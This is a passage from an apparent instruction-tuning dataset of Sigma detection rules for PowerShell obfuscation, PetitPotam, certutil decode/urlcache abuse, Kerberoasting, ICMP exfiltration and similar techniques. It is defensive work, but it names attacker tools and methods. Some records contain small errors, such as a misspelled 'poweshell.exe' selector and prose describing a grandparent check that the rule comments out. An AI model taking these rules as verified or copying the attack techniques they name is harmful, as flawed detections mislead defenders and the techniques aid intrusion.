      "answer": "In order to detect obfuscated PowerShell via the use of Rundll32 in scripts, you should monitor Windows PowerShell module logs for specific patterns that indicate potential suspicious activity. Focus on events with payload content that includes a combination of '&&', 'rundll32', 'shell32.dll', and 'shellexec_rundll'. These elements in conjunction with either of 'value', 'invoke', 'comspec', or 'iex' within the payload suggest an attempt to obscure the true nature of the PowerShell script's actions, which often involves invoking rundll32 to execute malicious code indirectly. This method of script obfuscation is a sophisticated technique used to evade detection by hiding the true intent of the PowerShell script, making it crucial to identify these patterns to mitigate possible threats. The detection of such activity is associated with high severity due to the potential for malicious actions being executed through obscure and indirect methods. Keep in mind that while this detection strategy is essential, false positives are unknown, indicating the necessity for manual verification of detected incidents to confirm their malicious nature."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting unique URL marker seen being used by RomCom potentially exploiting CVE-2023-36884.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a unique URL marker seen being used by RomCom potentially exploiting CVE-2023-36884, you should monitor proxy logs for any GET requests containing the specific path '/MSHTML_C7/' in the URI. This activity indicates an attempt to exploit a known vulnerability, thereby triggering a high alert due to its potential malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        c-uri|contains: '/MSHTML_C7/'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        c-uri|contains: '/MSHTML_C7/'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "unique URL marker seen being used by RomCom potentially exploiting CVE-2023-36884",
      "answer": "In order to detect a unique URL marker seen being used by RomCom potentially exploiting CVE-2023-36884, you should monitor proxy logs for any GET requests containing the specific path '/MSHTML_C7/' in the URI. This activity indicates an attempt to exploit a known vulnerability, thereby triggering a high alert due to its potential malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect PetitPotam coerced authentication activity..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PetitPotam coerced authentication activity, you should: Monitor security logs from Windows systems with a focus on events generated under the advanced audit policy setting for \"Object Access > Detailed File Share\", looking specifically for events tagged with Event ID 5145. This event signals a file share access attempt, and particular attention should be made to accesses where the share name starts with double backslashes (\\\\) and ends with '\\IPC$', which indicates an attempt to interact with the IPC$ share. The IPC$ share is a special shared folder used by Windows to enable remote procedure call (RPC) and other networking functions. A critical element to observe is the RelativeTargetName being set to 'lsarpc', which refers to the Local Security Authority (LSA) Remote Procedure Call, a common target in coercion attacks like PetitPotam for its role in authentication mechanisms. Furthermore, if the SubjectUserName in the event is recorded as 'ANONYMOUS LOGON', it raises additional suspicion. This username is often used in such attacks to exploit and coerce authentication without valid credentials. All these indicators combined represent a significant security event, potentially indicating an exploit attempt related to the PetitPotam vulnerability. This vulnerability leverages the MS-EFSRPC protocol to force remote Windows servers to authenticate against a threat actor-controlled machine, often leading to NTLM Relay attacks where the attacker can gain elevated privileges. \n\nGiven the potential severeness of the indicated activities, these events should be closely scrutinized, although it's noted that there might be false positives, and feedback to adjust detection mechanisms is welcomed. The primary intention is to identify and mitigate techniques associated with tactics such as Credential Access, Lateral Movement, and potentially others depending on the attacker's objectives following successful exploitation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName|startswith: '\\\\\\\\' # looking for the string \\\\somethink\\IPC$\n        ShareName|endswith: '\\IPC$'\n        RelativeTargetName: lsarpc\n        SubjectUserName: ANONYMOUS LOGON\n    condition: selection\nfalsepositives:\n    - Unknown. Feedback welcomed.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5145\n        ShareName|startswith: '\\\\\\\\' # looking for the string \\\\somethink\\IPC$\n        ShareName|endswith: '\\IPC$'\n        RelativeTargetName: lsarpc\n        SubjectUserName: ANONYMOUS LOGON\n    condition: selection\nfalsepositives:\n    - Unknown. Feedback welcomed.\nlevel: high\n",
      "question": "Detect PetitPotam coerced authentication activity.",
      "answer": "In order to detect PetitPotam coerced authentication activity, you should: Monitor security logs from Windows systems with a focus on events generated under the advanced audit policy setting for \"Object Access > Detailed File Share\", looking specifically for events tagged with Event ID 5145. This event signals a file share access attempt, and particular attention should be made to accesses where the share name starts with double backslashes (\\\\) and ends with '\\IPC$', which indicates an attempt to interact with the IPC$ share. The IPC$ share is a special shared folder used by Windows to enable remote procedure call (RPC) and other networking functions. A critical element to observe is the RelativeTargetName being set to 'lsarpc', which refers to the Local Security Authority (LSA) Remote Procedure Call, a common target in coercion attacks like PetitPotam for its role in authentication mechanisms. Furthermore, if the SubjectUserName in the event is recorded as 'ANONYMOUS LOGON', it raises additional suspicion. This username is often used in such attacks to exploit and coerce authentication without valid credentials. All these indicators combined represent a significant security event, potentially indicating an exploit attempt related to the PetitPotam vulnerability. This vulnerability leverages the MS-EFSRPC protocol to force remote Windows servers to authenticate against a threat actor-controlled machine, often leading to NTLM Relay attacks where the attacker can gain elevated privileges. \n\nGiven the potential severeness of the indicated activities, these events should be closely scrutinized, although it's noted that there might be false positives, and feedback to adjust detection mechanisms is welcomed. The primary intention is to identify and mitigate techniques associated with tactics such as Credential Access, Lateral Movement, and potentially others depending on the attacker's objectives following successful exploitation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code, you should: Monitor the creation of processes on Windows systems for specific occurrences where the certutil.exe utility is executed. Focus particularly on the instances where its command line arguments include operations such as decoding (both '-decode' and '/decode'), decoding hexadecimal data ('-decodehex' and '/decodehex'), caching URLs ('-urlcache' and '/urlcache'), verifying certificate trust lists ('-verifyctl' and '/verifyctl'), encoding ('-encode' and '/encode'), and exporting to PFX format ('-exportPFX' and '/exportPFX'). These particular functions of certutil.exe are noteworthy because they can potentially be exploited by an attacker to manipulate or retrieve malicious code. The detection pertains strongly to monitoring both the image name and original filename for instances of \u2018certutil.exe\u2019 as well as examining the command line parameters for the above-mentioned flags. Important fields to observe in the audit logs include the command line arguments and the parent command line arguments, to better understand the context in which certutil.exe was executed. Be aware that certain administrative tasks may legitimately use these certutil.exe features, thus some alerts might be benign and should be evaluated within the context of your environment to reduce false positives. The significance of monitoring these activities is marked as high due to the potential misuse of certutil.exe in malicious operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -decode '\n            - ' -decodehex '\n            - ' -urlcache '\n            - ' -verifyctl '\n            - ' -encode '\n            - ' -exportPFX '\n            - ' /decode '\n            - ' /decodehex '\n            - ' /urlcache '\n            - ' /verifyctl '\n            - ' /encode '\n            - ' /exportPFX '\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -decode '\n            - ' -decodehex '\n            - ' -urlcache '\n            - ' -verifyctl '\n            - ' -encode '\n            - ' -exportPFX '\n            - ' /decode '\n            - ' /decodehex '\n            - ' /urlcache '\n            - ' /verifyctl '\n            - ' /encode '\n            - ' /exportPFX '\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\n",
      "question": "suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code",
      "answer": "In order to detect a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code, you should: Monitor the creation of processes on Windows systems for specific occurrences where the certutil.exe utility is executed. Focus particularly on the instances where its command line arguments include operations such as decoding (both '-decode' and '/decode'), decoding hexadecimal data ('-decodehex' and '/decodehex'), caching URLs ('-urlcache' and '/urlcache'), verifying certificate trust lists ('-verifyctl' and '/verifyctl'), encoding ('-encode' and '/encode'), and exporting to PFX format ('-exportPFX' and '/exportPFX'). These particular functions of certutil.exe are noteworthy because they can potentially be exploited by an attacker to manipulate or retrieve malicious code. The detection pertains strongly to monitoring both the image name and original filename for instances of \u2018certutil.exe\u2019 as well as examining the command line parameters for the above-mentioned flags. Important fields to observe in the audit logs include the command line arguments and the parent command line arguments, to better understand the context in which certutil.exe was executed. Be aware that certain administrative tasks may legitimately use these certutil.exe features, thus some alerts might be benign and should be evaluated within the context of your environment to reduce false positives. The significance of monitoring these activities is marked as high due to the potential misuse of certutil.exe in malicious operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts.\nWithout knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to prevent adversaries with no prior knowledge of legitimate credentials within the system or environment from guessing passwords in an attempt to access accounts, you should monitor PowerShell scripts for specific signs of malicious activity targeting LDAP (Lightweight Directory Access Protocol) services. Focus on the Windows platform and ensure Script Block Logging is enabled to capture the necessary information. Look for any PowerShell scripts containing references to 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier', 'System.Net.NetworkCredential', or 'System.DirectoryServices.Protocols.LdapConnection'. These references might indicate an attempt to access LDAP services possibly for credential validation or usage in unauthorized manners. Be aware that this detection operates at a low level of alert, suggesting there might be unknown scenarios that trigger false positives. Therefore, while monitoring for these indicators is crucial, each alert should be carefully investigated to differentiate between malicious activities and benign operations involving LDAP queries or connections.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier'\n            - 'System.Net.NetworkCredential'\n            - 'System.DirectoryServices.Protocols.LdapConnection'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier'\n            - 'System.Net.NetworkCredential'\n            - 'System.DirectoryServices.Protocols.LdapConnection'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts.\nWithout knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism\n",
      "answer": "In order to prevent adversaries with no prior knowledge of legitimate credentials within the system or environment from guessing passwords in an attempt to access accounts, you should monitor PowerShell scripts for specific signs of malicious activity targeting LDAP (Lightweight Directory Access Protocol) services. Focus on the Windows platform and ensure Script Block Logging is enabled to capture the necessary information. Look for any PowerShell scripts containing references to 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier', 'System.Net.NetworkCredential', or 'System.DirectoryServices.Protocols.LdapConnection'. These references might indicate an attempt to access LDAP services possibly for credential validation or usage in unauthorized manners. Be aware that this detection operates at a low level of alert, suggesting there might be unknown scenarios that trigger false positives. Therefore, while monitoring for these indicators is crucial, each alert should be carefully investigated to differentiate between malicious activities and benign operations involving LDAP queries or connections."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft \u201cRoslyn\u201d Community Technology Preview was named 'rcsi.exe'.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential abuse of the 'csi.exe' and 'rcsi.exe' binaries which are legitimate Microsoft-signed executables from Visual Studio and are intended for running C# code interactively, often through the command line, you should:\n\nMonitor for the creation of processes that are named 'csi.exe' or 'rcsi.exe'. This can be identified when the executable image ends with these specific names or when the original file name matches 'csi.exe' or 'rcsi.exe'. Additionally, any command-line invocation of these executables coming from an entity identified as 'Microsoft Corporation' should be closely scrutinized. It's essential to capture key details such as the computer name, user account, full command line used to launch the process, and the parent command line if available. This allows for a comprehensive understanding of the context surrounding potential misuse. However, it\u2019s important to note that these utilities might be legitimately used by software developers; thus, some alerts might represent false positives. The monitoring approach should consider the balance between detecting malicious activity and minimizing interruptions to legitimate software development practices. These checks mainly focus on the tactics and techniques related to the execution phase of an attack, specifically monitoring the execution of Windows processes that could potentially be abused by attackers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\csi.exe'\n            - '\\rcsi.exe'\n        - OriginalFileName:\n            - 'csi.exe'\n            - 'rcsi.exe'\n    selection_cli:\n        Company: 'Microsoft Corporation'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate usage by software developers\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\csi.exe'\n            - '\\rcsi.exe'\n        - OriginalFileName:\n            - 'csi.exe'\n            - 'rcsi.exe'\n    selection_cli:\n        Company: 'Microsoft Corporation'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate usage by software developers\nlevel: medium\n",
      "question": "Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft \u201cRoslyn\u201d Community Technology Preview was named 'rcsi.exe'",
      "answer": "In order to detect potential abuse of the 'csi.exe' and 'rcsi.exe' binaries which are legitimate Microsoft-signed executables from Visual Studio and are intended for running C# code interactively, often through the command line, you should:\n\nMonitor for the creation of processes that are named 'csi.exe' or 'rcsi.exe'. This can be identified when the executable image ends with these specific names or when the original file name matches 'csi.exe' or 'rcsi.exe'. Additionally, any command-line invocation of these executables coming from an entity identified as 'Microsoft Corporation' should be closely scrutinized. It's essential to capture key details such as the computer name, user account, full command line used to launch the process, and the parent command line if available. This allows for a comprehensive understanding of the context surrounding potential misuse. However, it\u2019s important to note that these utilities might be legitimately used by software developers; thus, some alerts might represent false positives. The monitoring approach should consider the balance between detecting malicious activity and minimizing interruptions to legitimate software development practices. These checks mainly focus on the tactics and techniques related to the execution phase of an attack, specifically monitoring the execution of Windows processes that could potentially be abused by attackers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations, you should: Monitor process creation events on Windows systems for instances of the Remote Desktop Protocol (RDP) client process, mstsc.exe, being initiated. Specifically, look for the executable image name ending with '\\mstsc.exe' or where the OriginalFileName attribute is 'mstsc.exe'. Additionally, pay close attention to the command line arguments of these processes, especially focusing on instances where the command line ends with a reference to a '.rdp' file, indicating the use of a local RDP configuration file for the connection. Such '.rdp' files should raise suspicion if they are located in certain directories that are uncommon for legitimate RDP file storage. These directories include various system and temporary file paths such as ':\\Users\\Public\\', ':\\Windows\\System32\\spool\\drivers\\color', ':\\Windows\\System32\\Tasks_Migrated', ':\\Windows\\Tasks\\', ':\\Windows\\Temp\\', ':\\Windows\\Tracing\\', '\\AppData\\Local\\Temp\\', and '\\Downloads\\'. Monitoring for RDP connections initiated from or involving these paths can be critical for identifying unauthorized remote access attempts. However, it's important to adjust the scrutiny of these detection criteria based on the legitimate use of these paths in your environment, as the likelihood of false positives can vary. The detection of such activities is associated with high concern due to the potential for misuse in tactics like lateral movement and persistence.\n\nThis approach encapsulates the concept of monitoring for suspicious behavior associated with RDP usage, aiming to uncover potentially malicious activities attempting to exploit remote desktop protocols for unauthorized access or control within a Windows environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mstsc.exe'\n        - OriginalFileName: 'mstsc.exe'\n    selection_extension:\n        CommandLine|endswith:\n            - '.rdp'\n            - '.rdp\"'\n    selection_paths:\n        # Note: This list of paths is better transformed into a whitelist where you only exclude legitimate locations you use in your env\n        CommandLine|contains:\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\System32\\spool\\drivers\\color'\n            - ':\\Windows\\System32\\Tasks_Migrated '\n            - ':\\Windows\\Tasks\\'\n            - ':\\Windows\\Temp\\'\n            - ':\\Windows\\Tracing\\'\n            - '\\AppData\\Local\\Temp\\'\n            # - '\\Desktop\\' # Could be source of FP depending on the environment\n            - '\\Downloads\\' # Could be source of FP depending on the environment\n    condition: all of selection_*\nfalsepositives:\n    - Likelihood is related to how often the paths are used in the environment\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mstsc.exe'\n        - OriginalFileName: 'mstsc.exe'\n    selection_extension:\n        CommandLine|endswith:\n            - '.rdp'\n            - '.rdp\"'\n    selection_paths:\n        # Note: This list of paths is better transformed into a whitelist where you only exclude legitimate locations you use in your env\n        CommandLine|contains:\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\System32\\spool\\drivers\\color'\n            - ':\\Windows\\System32\\Tasks_Migrated '\n            - ':\\Windows\\Tasks\\'\n            - ':\\Windows\\Temp\\'\n            - ':\\Windows\\Tracing\\'\n            - '\\AppData\\Local\\Temp\\'\n            # - '\\Desktop\\' # Could be source of FP depending on the environment\n            - '\\Downloads\\' # Could be source of FP depending on the environment\n    condition: all of selection_*\nfalsepositives:\n    - Likelihood is related to how often the paths are used in the environment\nlevel: high\n",
      "question": "potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
      "answer": "In order to detect potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations, you should: Monitor process creation events on Windows systems for instances of the Remote Desktop Protocol (RDP) client process, mstsc.exe, being initiated. Specifically, look for the executable image name ending with '\\mstsc.exe' or where the OriginalFileName attribute is 'mstsc.exe'. Additionally, pay close attention to the command line arguments of these processes, especially focusing on instances where the command line ends with a reference to a '.rdp' file, indicating the use of a local RDP configuration file for the connection. Such '.rdp' files should raise suspicion if they are located in certain directories that are uncommon for legitimate RDP file storage. These directories include various system and temporary file paths such as ':\\Users\\Public\\', ':\\Windows\\System32\\spool\\drivers\\color', ':\\Windows\\System32\\Tasks_Migrated', ':\\Windows\\Tasks\\', ':\\Windows\\Temp\\', ':\\Windows\\Tracing\\', '\\AppData\\Local\\Temp\\', and '\\Downloads\\'. Monitoring for RDP connections initiated from or involving these paths can be critical for identifying unauthorized remote access attempts. However, it's important to adjust the scrutiny of these detection criteria based on the legitimate use of these paths in your environment, as the likelihood of false positives can vary. The detection of such activities is associated with high concern due to the potential for misuse in tactics like lateral movement and persistence.\n\nThis approach encapsulates the concept of monitoring for suspicious behavior associated with RDP usage, aiming to uncover potentially malicious activities attempting to exploit remote desktop protocols for unauthorized access or control within a Windows environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Exfiltration Over Alternative Protocol - ICMP, where adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel, you should focus on monitoring PowerShell scripts in Windows environments. Ensure that Script Block Logging is enabled to capture the PowerShell activities. Specifically, look for scripts that create a new object instance followed by initiating a ping using the 'System.Net.NetworkInformation.Ping' class and then sending it. This behavior could indicate an attempt to use ICMP for data exfiltration, which is not typical for standard PowerShell usage. Be aware, though, that legitimate scripts might also use the Ping class for valid purposes, so consider this when assessing alerts. This approach targets intermediate-level threats and helps to identify suspicious activities related to alternative data exfiltration methods.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'New-Object'\n            - 'System.Net.NetworkInformation.Ping'\n            - '.Send('\n    condition: selection\nfalsepositives:\n    - Legitimate usage of System.Net.NetworkInformation.Ping class\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'New-Object'\n            - 'System.Net.NetworkInformation.Ping'\n            - '.Send('\n    condition: selection\nfalsepositives:\n    - Legitimate usage of System.Net.NetworkInformation.Ping class\nlevel: medium\n",
      "question": "Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.",
      "answer": "In order to detect Exfiltration Over Alternative Protocol - ICMP, where adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel, you should focus on monitoring PowerShell scripts in Windows environments. Ensure that Script Block Logging is enabled to capture the PowerShell activities. Specifically, look for scripts that create a new object instance followed by initiating a ping using the 'System.Net.NetworkInformation.Ping' class and then sending it. This behavior could indicate an attempt to use ICMP for data exfiltration, which is not typical for standard PowerShell usage. Be aware, though, that legitimate scripts might also use the Ping class for valid purposes, so consider this when assessing alerts. This approach targets intermediate-level threats and helps to identify suspicious activities related to alternative data exfiltration methods."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious children of application launched from inside the WindowsApps directory. This could be a sign of a rogue \".appx\" package installation/execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious children of application launched from inside the WindowsApps directory, which could be a sign of a rogue \".appx\" package installation/execution, you should: monitor process creation events within the Windows operating system. Specifically, check for processes that have their grandparent process ending with '\\sihost.exe' or a parent process residing inside the 'C:\\Program Files\\WindowsApps\\' directory. Additionally, pay close attention to child processes that are known to be leveraged by attackers due to their powerful functionality and the ability to bypass security mechanisms. These processes include 'powershell.exe', 'pwsh.exe', 'rundll32.exe', 'regsvr32.exe', 'mshta.exe', 'cscript.exe', and 'wscript.exe'. Moreover, scrutinize the command line arguments of these processes for indications of malicious activity such as the use of 'cmd /c', PowerShell 'Invoke-' commands, or the presence of 'Base64' encoded strings, which often suggest an attempt to obscure malicious commands or payloads. The combination of a suspicious parent process path and the initiation of one of these potentially dangerous child processes or command line indicators should raise a high level of suspicion. However, be aware that there could be legitimate scenarios that trigger these conditions, so unknown false positives may occur.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_parent:\n        #GrandParentImage|endswith: '\\sihost.exe'\n        ParentImage|contains: 'C:\\Program Files\\WindowsApps\\'\n    selection_susp_img:\n        Image|endswith:\n            # You can add more LOLBINs\n            - '\\poweshell.exe'\n            - '\\pwsh.exe'\n            - '\\rundll32.exe'\n            - '\\regsvr32.exe'\n            - '\\mshta.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n    selection_susp_cli:\n        # You can add more suspicious keywords\n        CommandLine|contains:\n            - 'cmd /c'\n            - 'Invoke-'\n            - 'Base64'\n    condition: selection_parent and 1 of selection_susp_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_parent:\n        #GrandParentImage|endswith: '\\sihost.exe'\n        ParentImage|contains: 'C:\\Program Files\\WindowsApps\\'\n    selection_susp_img:\n        Image|endswith:\n            # You can add more LOLBINs\n            - '\\poweshell.exe'\n            - '\\pwsh.exe'\n            - '\\rundll32.exe'\n            - '\\regsvr32.exe'\n            - '\\mshta.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n    selection_susp_cli:\n        # You can add more suspicious keywords\n        CommandLine|contains:\n            - 'cmd /c'\n            - 'Invoke-'\n            - 'Base64'\n    condition: selection_parent and 1 of selection_susp_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious children of application launched from inside the WindowsApps directory. This could be a sign of a rogue \".appx\" package installation/execution",
      "answer": "In order to detect suspicious children of application launched from inside the WindowsApps directory, which could be a sign of a rogue \".appx\" package installation/execution, you should: monitor process creation events within the Windows operating system. Specifically, check for processes that have their grandparent process ending with '\\sihost.exe' or a parent process residing inside the 'C:\\Program Files\\WindowsApps\\' directory. Additionally, pay close attention to child processes that are known to be leveraged by attackers due to their powerful functionality and the ability to bypass security mechanisms. These processes include 'powershell.exe', 'pwsh.exe', 'rundll32.exe', 'regsvr32.exe', 'mshta.exe', 'cscript.exe', and 'wscript.exe'. Moreover, scrutinize the command line arguments of these processes for indications of malicious activity such as the use of 'cmd /c', PowerShell 'Invoke-' commands, or the presence of 'Base64' encoded strings, which often suggest an attempt to obscure malicious commands or payloads. The combination of a suspicious parent process path and the initiation of one of these potentially dangerous child processes or command line indicators should raise a high level of suspicion. However, be aware that there could be legitimate scenarios that trigger these conditions, so unknown false positives may occur."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting kerberos TGS request using RC4 encryption which may be indicative of kerberoasting.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect kerberos TGS request using RC4 encryption which may be indicative of kerberoasting, you should: Focus on analyzing Zeek logs specifically from the Kerberos service. Look for Ticket-Granting Service (TGS) requests that use RC4-HMAC encryption. It's important to filter out any service account requests that start with a '$', as these are generally considered normal enterprise Service Principal Name (SPN) request activities and not part of this detection strategy. Recognize that events meeting these criteria might indicate a potential kerberoasting attack, aiming to crack service account passwords. This detection strategy is of a medium level of urgency and helps in identifying possible malicious activities related to credential theft and lateral movement, aligning with tactics and techniques such as Credential Access through Kerberoasting. Keep in mind that while this method can be effective, it may also yield false positives in the form of normal enterprise SPN requests activity, requiring further investigation to confirm malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: zeek\n    service: kerberos\ndetection:\n    selection:\n        request_type: 'TGS'\n        cipher: 'rc4-hmac'\n    computer_acct:\n        service|startswith: '$'\n    condition: selection and not computer_acct\nfalsepositives:\n    - Normal enterprise SPN requests activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: zeek\n    service: kerberos\ndetection:\n    selection:\n        request_type: 'TGS'\n        cipher: 'rc4-hmac'\n    computer_acct:\n        service|startswith: '$'\n    condition: selection and not computer_acct\nfalsepositives:\n    - Normal enterprise SPN requests activity\nlevel: medium\n",
      "question": "kerberos TGS request using RC4 encryption which may be indicative of kerberoasting",
      "answer": "In order to detect kerberos TGS request using RC4 encryption which may be indicative of kerberoasting, you should: Focus on analyzing Zeek logs specifically from the Kerberos service. Look for Ticket-Granting Service (TGS) requests that use RC4-HMAC encryption. It's important to filter out any service account requests that start with a '$', as these are generally considered normal enterprise Service Principal Name (SPN) request activities and not part of this detection strategy. Recognize that events meeting these criteria might indicate a potential kerberoasting attack, aiming to crack service account passwords. This detection strategy is of a medium level of urgency and helps in identifying possible malicious activities related to credential theft and lateral movement, aligning with tactics and techniques such as Credential Access through Kerberoasting. Keep in mind that while this method can be effective, it may also yield false positives in the form of normal enterprise SPN requests activity, requiring further investigation to confirm malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Execute VBscript code that is referenced within the *.bgi file..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to execute VBscript code that is referenced within the *.bgi file, you should monitor the creation of processes on Windows systems, especially focusing on the execution of 'bginfo.exe'. Specifically, look for instances where 'bginfo.exe' is executed with command line parameters that include both '/popup' and '/nolicprompt'. These command line parameters are crucial indicators of the script\u2019s execution attempt without displaying license prompts, potentially for stealthy operations. It's important to note that detecting such activities can be challenging and might result in unknown false positives. The severity of this activity is considered medium.",
    "context": "",
